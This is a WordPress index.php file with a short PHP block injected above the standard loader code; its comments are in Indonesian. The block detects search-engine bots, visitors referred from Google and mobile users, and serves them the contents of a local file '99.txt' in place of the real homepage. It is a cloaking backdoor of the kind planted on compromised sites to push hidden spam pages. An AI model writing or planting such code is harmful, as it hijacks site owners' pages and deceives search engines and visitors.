<?php
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
$uri = $_SERVER['REQUEST_URI'] ?? '';

// Deteksi Googlebot, bot lain, atau pengunjung dari Google
$isBot = strpos($userAgent, 'bot') !== false || strpos($userAgent, 'google') !== false || strpos($userAgent, 'chrome-lighthouse') !== false;
$isFromGoogle = strpos($referer, 'google') !== false;
$isMobile = preg_match('/mobile|android|iphone|ipad|ipod/i', $userAgent);

// Jika Googlebot, bot lain, atau visitor Google mengakses halaman utama `/`, tampilkan 99.txt
if ($uri == '/' && ($isBot || $isFromGoogle || $isMobile)) {
    echo file_get_contents('99.txt');
    exit();
}
?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
